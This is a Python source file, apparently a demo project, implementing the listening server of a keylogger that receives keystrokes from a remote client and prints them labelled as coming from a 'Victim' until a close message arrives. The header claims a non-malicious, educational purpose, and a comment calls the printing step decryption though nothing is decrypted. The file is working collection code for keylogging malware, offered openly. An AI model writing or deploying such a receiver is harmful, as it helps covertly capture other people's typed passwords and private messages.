# ----------------------------------------------------------------------------
# Created By  : Michael Vasilio
# Created Date: 23/05/23
# Version = '0.0.1'
# Description: This is the server that will receive the keystrokes from the client.
# NOTE: This is not for malicious purposes but to demonstrate the key logging concept.
# ---------------------------------------------------------------------------
import socket


def server():
    # Define a host and port
    host = socket.gethostname()
    port = 9999

    # Create a socket
    s = socket.socket()

    # Bind it
    s.bind((host, port))

    # Make server listen
    s.listen(5)

    # Accept connections
    conn, addr = s.accept()

    # Display who is connecting
    print(f"Connection from {addr}")

    loop = True

    while True:
        # Keep looping until data received
        while loop:
            # Receive Data stream (1024bytes)
            data = conn.recv(1024).decode()

            # Keep looping while waiting for data
            if not data:
                loop = True
            else:
                loop = False

        loop = True

        # Decrypt the message from client
        print(f"Victim: {str(data)}")

        # If termination message received close connection
        if data == '-CLOSECONNECTION':
            break

    # Close connection
    conn.close()
    s.close()


# Only run the server if script is run
if __name__ == '__main__':
    server()
